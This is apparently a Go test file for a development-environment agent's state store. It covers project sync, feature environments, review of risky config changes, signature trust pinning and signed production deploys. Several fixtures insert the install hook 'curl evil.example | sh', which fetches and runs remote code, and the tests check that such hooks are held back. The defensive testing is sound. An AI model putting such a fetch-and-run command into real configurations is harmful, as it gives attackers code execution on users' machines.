package store

import (
	"bytes"
	"encoding/base64"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	agentv2 "github.com/amalychev/devopus/gen/devopus/agent/v2"
	"github.com/amalychev/devopus/internal/signing"
)

// served registers a project as the workspace server gives it.
func served(t *testing.T, s *Store, names ...string) {
	t.Helper()
	var ps []ServerProject
	for _, n := range names {
		ps = append(ps, ServerProject{Name: n, Spec: []byte("name: " + n + "\ndomain: " + n + ".localhost\n"), Version: 1})
	}
	if _, _, err := s.SyncServer("wsp_1", "", ServerKey{}, ps, nil, func(n string) string { return "/data/projects/" + n }); err != nil {
		t.Fatal(err)
	}
}

func TestUpDownPersist(t *testing.T) {
	path := filepath.Join(t.TempDir(), "state.json")
	s, err := Open(path)
	if err != nil {
		t.Fatal(err)
	}
	if _, _, err := s.Up("shop"); !errors.Is(err, ErrUnknownProject) {
		t.Fatalf("up of a project the server did not give: %v", err)
	}
	served(t, s, "shop")
	select {
	case <-s.Changed():
	default:
		t.Error("no change signal")
	}
	id, rev, err := s.Up("shop")
	if err != nil || rev != 2 || len(id) != 6 {
		t.Fatalf("up: %q %d %v", id, rev, err)
	}
	// Up again keeps the environment.
	if id2, _, _ := s.Up("shop"); id2 != id {
		t.Errorf("second up: %q", id2)
	}
	if _, err := s.Down("nope", false); !errors.Is(err, ErrUnknownProject) {
		t.Errorf("unknown: %v", err)
	}
	if _, err := s.Down("shop", false); err != nil {
		t.Fatal(err)
	}

	// A new process reads what the previous one wrote; failed updates left no trace.
	s2, err := Open(path)
	if err != nil {
		t.Fatal(err)
	}
	st := s2.Snapshot()
	if len(st.Projects) != 1 || !st.Projects[0].Held || st.Projects[0].WorkspaceId != "wsp_1" {
		t.Fatalf("reloaded: %v", st)
	}
	if e := st.Environments[0]; e.Id != id || e.Phase != agentv2.DesiredPhase_DESIRED_PHASE_STOPPED {
		t.Errorf("env: %v", e)
	}
	// down --volumes of a workspace project keeps it registered and held.
	if _, err := s2.Down("shop", true); err != nil {
		t.Fatal(err)
	}
	if st := s2.Snapshot(); len(st.Projects) != 1 || len(st.Environments) != 0 {
		t.Errorf("after purge: %v", st)
	}
}

func TestFeatures(t *testing.T) {
	s, err := Open(filepath.Join(t.TempDir(), "state.json"))
	if err != nil {
		t.Fatal(err)
	}
	served(t, s, "shop")
	f, base, _, err := s.CreateFeature("shop", NewFeature{Name: "PAY-123", Branch: "feature/PAY-123", Apps: []string{"web", "api", "web"}, Reserved: []string{"mail"}})
	if err != nil {
		t.Fatal(err)
	}
	if f.Slug != "pay-123" || f.Kind != agentv2.EnvironmentKind_ENVIRONMENT_KIND_FEATURE || len(f.ForkedApps) != 2 {
		t.Errorf("feature = %v", f)
	}
	if base.Kind != agentv2.EnvironmentKind_ENVIRONMENT_KIND_BASE || base.Phase != agentv2.DesiredPhase_DESIRED_PHASE_RUNNING {
		t.Errorf("base = %v", base)
	}
	if _, _, _, err := s.CreateFeature("shop", NewFeature{Name: "pay-123"}); !errors.Is(err, ErrFeatureExists) {
		t.Errorf("same name: %v", err)
	}
	// Different names, same slug; and a slug an exposed web UI has.
	g, _, _, err := s.CreateFeature("shop", NewFeature{Name: "pay_123"})
	if err != nil || g.Slug != "pay-123-2" {
		t.Errorf("collision: %v %v", g, err)
	}
	m, _, _, err := s.CreateFeature("shop", NewFeature{Name: "Mail", Reserved: []string{"mail"}})
	if err != nil || m.Slug != "mail-2" {
		t.Errorf("reserved: %v %v", m, err)
	}
	if _, _, _, err := s.CreateFeature("shop", NewFeature{Name: "---"}); err == nil {
		t.Error("a name without letters must fail")
	}
	if _, _, _, err := s.CreateFeature("nope", NewFeature{Name: "x"}); !errors.Is(err, ErrUnknownProject) {
		t.Errorf("feature of an unknown project: %v", err)
	}

	e, _, err := s.AddFeatureApps("shop", "pay-123", []string{"payments", "api"})
	if err != nil || len(e.ForkedApps) != 3 {
		t.Errorf("add: %v %v", e, err)
	}
	if _, _, err := s.AddFeatureApps("shop", "nope", nil); !errors.Is(err, ErrUnknownFeature) {
		t.Errorf("add to unknown: %v", err)
	}

	// Down stops everything, up starts features again.
	if _, err := s.Down("shop", false); err != nil {
		t.Fatal(err)
	}
	if _, _, err := s.Up("shop"); err != nil {
		t.Fatal(err)
	}
	for _, e := range s.Snapshot().Environments {
		if e.Phase != agentv2.DesiredPhase_DESIRED_PHASE_RUNNING {
			t.Errorf("%s is %v after up", e.Id, e.Phase)
		}
	}

	refuse := errors.New("unsaved")
	if _, _, err := s.RemoveFeature("shop", f.Id, func(*agentv2.EnvironmentSpec) error { return refuse }); !errors.Is(err, refuse) {
		t.Errorf("check: %v", err)
	}
	if s.Feature("shop", "PAY-123") == nil {
		t.Fatal("a refused removal removed the feature")
	}
	if _, _, err := s.RemoveFeature("shop", "PAY-123", nil); err != nil {
		t.Fatal(err)
	}
	if s.Feature("shop", "pay-123") != nil || len(s.Snapshot().Environments) != 3 {
		t.Errorf("after remove: %v", s.Snapshot().Environments)
	}
}

// A project registered from a folder before R10 keeps running from the state file.
func TestFolderProjectFromBefore(t *testing.T) {
	path := filepath.Join(t.TempDir(), "state.json")
	legacy := `{"revision":"3","projects":[{"name":"local","root":"/src/local","config":"` +
		base64.StdEncoding.EncodeToString([]byte("version: 1\nproject: local\ndomain: local.localhost\nmodules:\n  web:\n    path: web\n    image: nginx:1.27\n")) +
		`"}],"environments":[{"id":"b1","project":"local","kind":"ENVIRONMENT_KIND_BASE","phase":"DESIRED_PHASE_RUNNING"}]}`
	if err := os.WriteFile(path, []byte(legacy), 0o600); err != nil {
		t.Fatal(err)
	}
	s, err := Open(path)
	if err != nil {
		t.Fatal(err)
	}
	p, err := ParseProject(s.Snapshot().Projects[0])
	if err != nil || p.Domain != "local.localhost" || p.Apps["web"] == nil {
		t.Fatalf("legacy project: %+v %v", p, err)
	}
	if _, _, err := s.Up("local"); err != nil {
		t.Errorf("up of the legacy project: %v", err)
	}
	if _, err := s.Down("local", true); err != nil || len(s.Snapshot().Projects) != 0 {
		t.Errorf("purge of the legacy project: %v", err)
	}
}

// A state file of agent/v1 keeps its features.
func TestOpenMigratesV1(t *testing.T) {
	path := filepath.Join(t.TempDir(), "state.json")
	v1 := `{"revision":"3","environments":[{"id":"f1","project":"p","kind":"ENVIRONMENT_KIND_FEATURE","forkedModules":["api","web"]}]}`
	if err := os.WriteFile(path, []byte(v1), 0o600); err != nil {
		t.Fatal(err)
	}
	s, err := Open(path)
	if err != nil {
		t.Fatal(err)
	}
	if got := s.Snapshot().Environments[0].ForkedApps; len(got) != 2 || got[0] != "api" {
		t.Fatalf("forked apps %v", got)
	}
}

func TestSyncServer(t *testing.T) {
	s, err := Open(filepath.Join(t.TempDir(), "state.json"))
	if err != nil {
		t.Fatal(err)
	}
	root := func(name string) string { return "/data/projects/" + name }
	shop := ServerProject{Name: "shop", Spec: []byte("name: shop\ndomain: shop.localhost\n"), Version: 1}
	blog := ServerProject{Name: "blog", Spec: []byte("name: blog\ndomain: blog.localhost\n"), Version: 4}
	// A project of a folder from before R10 keeps its name.
	legacy := []byte(`{"projects":[{"name":"local","root":"/src/local","config":"dmVyc2lvbjogMQ=="}]}`)
	if err := os.WriteFile(s.path, legacy, 0o600); err != nil {
		t.Fatal(err)
	}
	if s, err = Open(s.path); err != nil {
		t.Fatal(err)
	}
	clash := ServerProject{Name: "local", Spec: []byte("name: local\n"), Version: 1}

	rev, conflicts, err := s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{shop, blog, clash}, nil, root)
	if err != nil || len(conflicts) != 1 || conflicts[0] != "local" {
		t.Fatalf("sync: %v %v", conflicts, err)
	}
	phase := func(project string) agentv2.DesiredPhase {
		for _, e := range s.Snapshot().Environments {
			if e.Project == project && e.Kind == agentv2.EnvironmentKind_ENVIRONMENT_KIND_BASE {
				return e.Phase
			}
		}
		return -1
	}
	project := func(name string) *agentv2.ProjectSpec {
		for _, p := range s.Snapshot().Projects {
			if p.Name == name {
				return p
			}
		}
		return nil
	}
	// New projects come up on their own: a new member does nothing.
	if phase("shop") != agentv2.DesiredPhase_DESIRED_PHASE_RUNNING || project("shop").Root != "/data/projects/shop" || project("shop").AdminEmail != "admin@acme.dev" {
		t.Fatalf("shop: %v %+v", phase("shop"), project("shop"))
	}
	if p, err := ParseProject(project("shop")); err != nil || p.Domain != "shop.localhost" {
		t.Fatalf("parse: %+v %v", p, err)
	}
	if string(project("local").Config) != "version: 1" || project("local").WorkspaceId != "" {
		t.Error("the folder's project was replaced")
	}
	// The same state again changes nothing.
	if again, _, _ := s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{shop, blog, clash}, nil, root); again != rev {
		t.Errorf("revision moved without a change: %d → %d", rev, again)
	}

	// Held with down: a new version does not start it; up does.
	if _, err := s.Down("shop", false); err != nil {
		t.Fatal(err)
	}
	shop.Version, shop.Spec = 2, []byte("name: shop\ndomain: shop.test\n")
	s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{shop, blog}, nil, root)
	if phase("shop") != agentv2.DesiredPhase_DESIRED_PHASE_STOPPED || project("shop").ConfigVersion != 2 || !project("shop").Held {
		t.Fatalf("held shop: %v %+v", phase("shop"), project("shop"))
	}
	if _, _, err := s.Up("shop"); err != nil {
		t.Fatal(err)
	}
	if phase("shop") != agentv2.DesiredPhase_DESIRED_PHASE_RUNNING || project("shop").Held || project("shop").Root != "/data/projects/shop" {
		t.Fatalf("up shop: %v %+v", phase("shop"), project("shop"))
	}

	// Gone from the server: stopped, kept, and not to be brought up.
	s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{shop}, nil, root)
	if !project("blog").Orphaned || phase("blog") != agentv2.DesiredPhase_DESIRED_PHASE_STOPPED {
		t.Fatalf("blog: %+v", project("blog"))
	}
	if _, _, err := s.Up("blog"); !errors.Is(err, ErrUnknownProject) {
		t.Errorf("up of an orphan: %v", err)
	}
	// Back on the server: it comes up again.
	s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{shop, blog}, nil, root)
	if project("blog").Orphaned || phase("blog") != agentv2.DesiredPhase_DESIRED_PHASE_RUNNING {
		t.Fatalf("blog back: %+v", project("blog"))
	}

	// down --volumes of a server project drops its environments, keeps it held.
	if _, err := s.Down("blog", true); err != nil {
		t.Fatal(err)
	}
	if project("blog") == nil || !project("blog").Held || phase("blog") != -1 {
		t.Fatalf("purged blog: %+v %v", project("blog"), phase("blog"))
	}
	if _, err := s.Link("blog", "/src/blog"); err != nil || project("blog").Root != "/src/blog" {
		t.Errorf("link: %v", err)
	}
	if _, err := s.Link("local", "/x"); !errors.Is(err, ErrUnknownProject) {
		t.Errorf("link of a folder's project: %v", err)
	}
}

func TestRiskyVersionWaits(t *testing.T) {
	s, err := Open(filepath.Join(t.TempDir(), "desired.json"))
	if err != nil {
		t.Fatal(err)
	}
	root := func(name string) string { return "/data/projects/" + name }
	v1 := "name: shop\ndomain: shop.localhost\napps:\n  api:\n    repo: git@x:acme/api.git\n    command: php -S 0.0.0.0:8080\nservices:\n  php:\n    type: php\n    version: \"8.3\"\n    apps: [api]\n"
	sync := func(version int32, text string) *agentv2.ProjectSpec {
		t.Helper()
		if _, _, err := s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{{Name: "shop", Spec: []byte(text), Version: version}}, nil, root); err != nil {
			t.Fatal(err)
		}
		return s.Snapshot().Projects[0]
	}

	// The first version comes in as it is: that is joining the team.
	if p := sync(1, v1); p.ConfigVersion != 1 || p.Pending != nil {
		t.Fatalf("v1: %+v", p)
	}
	// A teamlead's everyday change applies at once.
	v2 := strings.Replace(v1, `"8.3"`, `"8.4"`, 1)
	if p := sync(2, v2); p.ConfigVersion != 2 || p.Pending != nil {
		t.Fatalf("v2: %+v", p)
	}
	// A hook waits; the project keeps running v2.
	v3 := strings.Replace(v2, "    command: php", "    hooks:\n      install: curl evil.example | sh\n    command: php", 1)
	p := sync(3, v3)
	if p.ConfigVersion != 2 || string(p.Spec) != v2 || p.Pending == nil || p.Pending.Version != 3 ||
		len(p.Pending.Risky) != 1 || !strings.Contains(p.Pending.Risky[0], "apps.api.hooks") {
		t.Fatalf("v3: %+v", p)
	}
	// Declined: kept, not asked again for the same version.
	if _, err := s.ReviewChanges("shop", p.Pending.Hash, false); err != nil {
		t.Fatal(err)
	}
	if p := sync(3, v3); p.ConfigVersion != 2 || p.Pending != nil {
		t.Fatalf("declined v3: %+v", p)
	}
	// A newer version still has the hook: asked again.
	v4 := strings.Replace(v3, "shop.localhost", "shop.test", 1)
	p = sync(4, v4)
	if p.Pending == nil || p.Pending.Version != 4 || len(p.Pending.Other) != 1 {
		t.Fatalf("v4: %+v", p)
	}
	// Accepting another version than the one shown is refused.
	if _, err := s.ReviewChanges("shop", "deadbeef", true); !errors.Is(err, ErrNoPending) {
		t.Errorf("stale accept: %v", err)
	}
	if _, err := s.ReviewChanges("shop", p.Pending.Hash, true); err != nil {
		t.Fatal(err)
	}
	if p := s.Snapshot().Projects[0]; p.ConfigVersion != 4 || string(p.Spec) != v4 || p.Pending != nil {
		t.Fatalf("accepted v4: %+v", p)
	}

	// The user's own change applies without asking — only as they sent it.
	if _, err := s.ExpectChange("shop", "apps.api", []byte("repo: git@x:acme/api.git\ncommand: php -S 0.0.0.0:9090\nhooks:\n  install: curl evil.example | sh\n")); err != nil {
		t.Fatal(err)
	}
	v5 := strings.Replace(v4, "0.0.0.0:8080", "0.0.0.0:9090", 1)
	if p := sync(5, v5); p.ConfigVersion != 5 || p.Pending != nil || len(p.Expected) != 0 {
		t.Fatalf("own v5: %+v", p)
	}
	if _, err := s.ExpectChange("shop", "apps.api", []byte("repo: git@x:acme/api.git\ncommand: ./serve\n")); err != nil {
		t.Fatal(err)
	}
	v6 := strings.Replace(v5, "php -S 0.0.0.0:9090", "./serve-and-mine", 1)
	if p := sync(6, v6); p.ConfigVersion != 5 || p.Pending == nil {
		t.Fatalf("v6 is not what the user sent: %+v", p)
	}
	// An expectation is the whole section as sent: one without the hook does not cover
	// a version with it. The right one, coming after the version, applies it then.
	v7 := strings.Replace(v5, "php -S 0.0.0.0:9090", "./serve", 1)
	if p := sync(7, v7); p.Pending == nil || p.Pending.Version != 7 {
		t.Fatalf("v7 before the expectation: %+v", p)
	}
	if _, err := s.ExpectChange("shop", "apps.api", []byte("repo: git@x:acme/api.git\ncommand: ./serve\nhooks:\n  install: curl evil.example | sh\n")); err != nil {
		t.Fatal(err)
	}
	if p := s.Snapshot().Projects[0]; p.ConfigVersion != 7 || p.Pending != nil {
		t.Fatalf("v7 after the expectation: %+v", p)
	}
}

func TestSignedVersions(t *testing.T) {
	s, err := Open(filepath.Join(t.TempDir(), "desired.json"))
	if err != nil {
		t.Fatal(err)
	}
	root := func(name string) string { return "/data/projects/" + name }
	adminKey, _ := signing.NewKey()
	leadKey, _ := signing.NewKey()
	evilKey, _ := signing.NewKey()
	cert := adminKey.Sign(signing.SignerMessage("wsp_1", "usr_lead", "lead@acme.dev", "lead-mac", leadKey.Public()))
	trust := &signing.Set{Root: adminKey.Public(), RootDevice: "admin-mac", RootEmail: "admin@acme.dev",
		Signers: []signing.Signer{{DeviceID: "lead-mac", UserID: "usr_lead", Email: "lead@acme.dev", Public: leadKey.Public(), Certificate: cert}}}
	v1 := "name: shop\napps:\n  api:\n    repo: git@x:acme/api.git\n    command: ./serve\n"
	sync := func(version int32, text string, k signing.Key, device string, t2 *signing.Set) *agentv2.ProjectSpec {
		t.Helper()
		sp := ServerProject{Name: "shop", Spec: []byte(text), Version: version, SignerDevice: device}
		if device != "" {
			sp.Signature = k.Sign(signing.SettingsMessage("wsp_1", "shop", version, []byte(text)))
		}
		if _, _, err := s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{sp}, t2, root); err != nil {
			t.Fatal(err)
		}
		return s.Snapshot().Projects[0]
	}
	if p := sync(1, v1, adminKey, "admin-mac", trust); p.ConfigVersion != 1 || p.SignedBy != "admin@acme.dev" {
		t.Fatalf("v1: %+v", p)
	}
	if r := s.Snapshot().TrustRoots["wsp_1"]; r == nil || !bytes.Equal(r.PublicKey, adminKey.Public()) {
		t.Fatalf("not pinned: %+v", r)
	}

	// A hook signed by the certified teamlead: applied without asking.
	v2 := strings.Replace(v1, "    command:", "    hooks:\n      install: make deps\n    command:", 1)
	if p := sync(2, v2, leadKey, "lead-mac", trust); p.ConfigVersion != 2 || p.Pending != nil || p.SignedBy != "lead@acme.dev" {
		t.Fatalf("signed v2: %+v", p)
	}
	// Unsigned: waits, and says why.
	v3 := strings.Replace(v2, "make deps", "curl evil.example | sh", 1)
	if p := sync(3, v3, signing.Key{}, "", trust); p.Pending == nil || !strings.Contains(p.Pending.Unverified, "not signed") {
		t.Fatalf("unsigned v3: %+v", p)
	}
	// Signed by a key the server slips in as certified by its own root: the pinned root
	// does not know it.
	evilTrust := &signing.Set{Root: evilKey.Public(), RootDevice: "evil", RootEmail: "admin@acme.dev"}
	p := sync(3, v3, evilKey, "evil", evilTrust)
	if p.Pending == nil || p.ConfigVersion != 2 {
		t.Fatalf("v3 under another root: %+v", p)
	}
	if r := s.Snapshot().TrustRoots["wsp_1"]; !bytes.Equal(r.PublicKey, adminKey.Public()) || !bytes.Equal(r.Offered, evilKey.Public()) {
		t.Errorf("the root after the server offered another: %+v", r)
	}
	// An uncertified device signs; once the admin certifies it, the waiting version applies.
	newLead, _ := signing.NewKey()
	if p := sync(3, v3, newLead, "lead-mac2", trust); p.Pending == nil || !strings.Contains(p.Pending.Unverified, "not certified") {
		t.Fatalf("uncertified: %+v", p)
	}
	trust.Signers = append(trust.Signers, signing.Signer{DeviceID: "lead-mac2", UserID: "usr_lead", Email: "lead@acme.dev", Public: newLead.Public(),
		Certificate: adminKey.Sign(signing.SignerMessage("wsp_1", "usr_lead", "lead@acme.dev", "lead-mac2", newLead.Public()))})
	if p := sync(3, v3, newLead, "lead-mac2", trust); p.ConfigVersion != 3 || p.Pending != nil {
		t.Fatalf("certified later: %+v", p)
	}
}

// An admin's server applies nothing without a trusted signature: not the first
// version, not an everyday change.
func TestStrictServer(t *testing.T) {
	s, err := Open(filepath.Join(t.TempDir(), "desired.json"))
	if err != nil {
		t.Fatal(err)
	}
	s.Strict = true
	root := func(name string) string { return "/srv/" + name }
	adminKey, _ := signing.NewKey()
	trust := &signing.Set{Root: adminKey.Public(), RootDevice: "admin-mac", RootEmail: "admin@acme.dev"}
	v1 := "name: shop\nservices:\n  php:\n    type: php\n    version: \"8.3\"\n"
	sync := func(version int32, text string, signed bool) []*agentv2.ProjectSpec {
		t.Helper()
		sp := ServerProject{Name: "shop", Spec: []byte(text), Version: version}
		if signed {
			sp.SignerDevice, sp.Signature = "admin-mac", adminKey.Sign(signing.SettingsMessage("wsp_1", "shop", version, []byte(text)))
		}
		if _, _, err := s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{sp}, trust, root); err != nil {
			t.Fatal(err)
		}
		return s.Snapshot().Projects
	}
	if ps := sync(1, v1, false); len(ps) != 0 || len(s.Withheld()) != 1 || !strings.Contains(s.Withheld()[0], "not signed") {
		t.Fatalf("unsigned first version taken: %v %v", ps, s.Withheld())
	}
	if ps := sync(1, v1, true); len(ps) != 1 || ps[0].ConfigVersion != 1 || len(s.Withheld()) != 0 {
		t.Fatalf("signed first version: %v", ps)
	}
	v2 := strings.Replace(v1, `"8.3"`, `"8.4"`, 1)
	if ps := sync(2, v2, false); ps[0].ConfigVersion != 1 || ps[0].Pending == nil || len(ps[0].Pending.Other) != 1 {
		t.Fatalf("unsigned everyday change: %+v", ps[0])
	}
	if ps := sync(2, v2, true); ps[0].ConfigVersion != 2 || ps[0].Pending != nil {
		t.Fatalf("signed: %+v", ps[0])
	}
}

// Production runs a version only with its deploy signed too.
func TestProductionNeedsDeploy(t *testing.T) {
	s, err := Open(filepath.Join(t.TempDir(), "desired.json"))
	if err != nil {
		t.Fatal(err)
	}
	s.Strict = true
	root := func(name string) string { return "/srv/" + name }
	admin, _ := signing.NewKey()
	trust := &signing.Set{Root: admin.Public(), RootDevice: "admin-mac", RootEmail: "admin@acme.dev"}
	env := func() *ServerEnvironment {
		return &ServerEnvironment{ServerID: "srv_1", Kind: "production", Domain: "shop.example.com", SignerDevice: "admin-mac",
			Signature: admin.Sign(signing.EnvironmentMessage("wsp_1", "srv_1", "shop", "production", "shop.example.com"))}
	}
	sync := func(version int32, text string, deployOf int32, deployText string) *agentv2.ProjectSpec {
		t.Helper()
		e := env()
		if deployOf != 0 {
			e.DeploySignerDevice, e.DeploySignature = "admin-mac", admin.Sign(signing.DeployMessage("wsp_1", "srv_1", "shop", deployOf, []byte(deployText)))
		}
		sp := ServerProject{Name: "shop", Spec: []byte(text), Version: version, Environment: e, SignerDevice: "admin-mac",
			Signature: admin.Sign(signing.SettingsMessage("wsp_1", "shop", version, []byte(text)))}
		if _, _, err := s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{sp}, trust, root); err != nil {
			t.Fatal(err)
		}
		if ps := s.Snapshot().Projects; len(ps) == 1 {
			return ps[0]
		}
		return nil
	}
	v1 := "name: shop\nservices:\n  php:\n    type: php\n    version: \"8.3\"\n"
	v2 := strings.Replace(v1, `"8.3"`, `"8.4"`, 1)
	if p := sync(1, v1, 0, ""); p != nil {
		t.Fatalf("signed settings without a deploy: %+v", p)
	}
	if p := sync(1, v1, 1, v1); p == nil || p.ConfigVersion != 1 || p.DeployedBy != "admin@acme.dev" || p.PublicDomain != "shop.example.com" {
		t.Fatalf("deployed v1: %+v", p)
	}
	// A deploy of v1 does not carry v2.
	if p := sync(2, v2, 1, v1); p.ConfigVersion != 1 || p.Pending == nil || !strings.Contains(p.Pending.Unverified, "deploy") {
		t.Fatalf("v2 under v1's deploy: %+v", p)
	}
	if p := sync(2, v2, 2, v2); p.ConfigVersion != 2 || p.Pending != nil {
		t.Fatalf("deployed v2: %+v", p)
	}
	// A rollback is a deploy of the older version.
	if p := sync(1, v1, 1, v1); p.ConfigVersion != 1 || p.Pending != nil {
		t.Fatalf("rolled back: %+v", p)
	}
}
